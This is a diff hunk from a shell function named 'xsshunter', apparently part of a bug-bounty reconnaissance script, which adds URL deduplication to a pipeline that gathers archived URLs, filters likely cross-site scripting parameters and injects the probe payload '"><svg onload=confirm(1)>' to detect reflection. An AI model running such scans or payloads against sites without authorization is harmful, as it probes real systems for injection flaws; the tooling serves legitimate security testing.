@@ -260,8 +260,8 @@ xsshunter() {
   # [ -s "urlbhedak.txt" ] && cat urlbhedak.txt | notify -silent -id xss
   [ -s "ALLHTTP" ] && cat ALLHTTP | gauplus | uro | anew waybackdata
   [ -s "ALLHTTP" ] && cat ALLHTTP | waybackurls | uro | anew waybackdata 
-  [ -s "waybackdata" ] && cat waybackdata | gf xss | httpx -silent | anew xssvector
-  [ -s "waybackdata" ] && cat waybackdata | kxss | awk '{print $9}' | anew xssvector
+  [ -s "waybackdata" ] && cat waybackdata | uro | gf xss | httpx -silent | anew xssvector
+  [ -s "waybackdata" ] && cat waybackdata | uro | kxss | awk '{print $9}' | anew xssvector
   echo '[+] Airixss xss'
   [ -s "xssvector" ] && cat xssvector | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not' | anew airixss.txt
   [ -s "airixss.txt" ] && cat airixss.txt | notify -silent -id xss
